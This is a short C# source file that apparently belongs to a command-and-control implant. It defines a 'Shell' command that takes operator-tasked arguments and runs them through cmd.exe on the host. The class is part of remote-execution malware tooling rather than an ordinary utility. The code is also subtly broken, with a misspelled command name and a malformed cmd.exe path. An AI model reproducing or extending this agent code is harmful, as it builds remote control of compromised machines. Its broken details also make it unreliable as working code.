using Agent.Models;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;


namespace Agent.Commands
{
    public  class Shell :AgentsCommand
    {

        public override string Name => "Shel";
        public override string Execute(AgentTask task)
        {

            var args = string.Join(" ", task.Arguments);

            return Internal.Execute.ExecuteCommand(@"C:\Windows|System32\cmd.exe", args);
        }


   
           
    }

}
